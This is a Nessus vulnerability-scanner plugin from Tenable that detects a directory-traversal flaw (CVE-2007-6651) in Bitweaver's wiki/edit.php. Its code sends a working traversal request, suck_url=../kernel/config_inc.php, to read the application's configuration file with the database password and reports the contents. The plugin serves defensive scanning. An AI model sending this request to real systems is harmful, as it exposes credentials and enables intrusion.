#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(29854);
  script_version("$Revision: 1.17 $");

  script_cve_id("CVE-2007-6651");
  script_bugtraq_id(27081);
  script_osvdb_id(39915);
  script_xref(name:"EDB-ID", value:"4814");

  script_name(english:"Bitweaver wiki/edit.php suck_url Parameter Traversal Source Code Disclosure");
  script_summary(english:"Tries to retrieve a local file using edit.php");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is prone to a
directory traversal attack." );
 script_set_attribute(attribute:"description", value:
"The remote host is running Bitweaver, an open source content
management system written in PHP. 

The version of this software installed on the remote host fails to
sanitize input to the 'suck_url' parameter of the 'wiki/edit.php'
script of directory traversal sequences.  An unauthenticated attacker
can leverage this issue to read the contents of sensitive files to
which access  might not otherwise be permitted, such as the application's
configuration file. 

Note that there are reportedly several other vulnerabilities
associated with this version of Bitweaver, although Nessus has not
checked for them." );
 script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2007/Dec/346" );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
 script_cwe_id(22);
 script_set_attribute(attribute:"plugin_publication_date", value: "2008/01/07");
 script_cvs_date("$Date: 2016/10/07 13:30:47 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"cpe", value: "cpe:/a:bitweaver:bitweaver");
script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2008-2016 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");
  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);


# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/bitweaver", "/site", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Try to read the application's configuration file.
  file = "../kernel/config_inc.php";

  r = http_send_recv3(method:"GET", port: port,
    item:string(
      dir, "/wiki/edit.php?",
      "page=SandBox&",
      "suck_url=", file, "&",
      "do_suck=h"));
  if (isnull(r)) exit(0);
  res = r[2];

  # There's a problem if the output looks like the content of the file.
  if (
    ' name="edit" >' >< res &&
    "$gBitDbPassword" >< res &&
    egrep(pattern:"define *([^\)])*BIT_ROOT_URL", string:res)
  )
  {
    contents = strstr(res, ' name="edit" >') - ' name="edit" >';
    if ("</textarea></div></div>" >< contents)
      contents = contents - strstr(contents, "</textarea></div></div>");
    if ("$gBitDbPassword" >!< contents) contents = res;

    if (report_verbosity > 0)
    {
      info = string(
        "\n",
        "Here are the contents of Bitweaver's 'kernel/config_inc.php' file\n",
        "that Nessus was able to read from the remote host :\n",
        "\n",
        contents
      );
      security_warning(port:port, extra:info);
    }
    else security_warning(port);
    exit(0);
  }
}
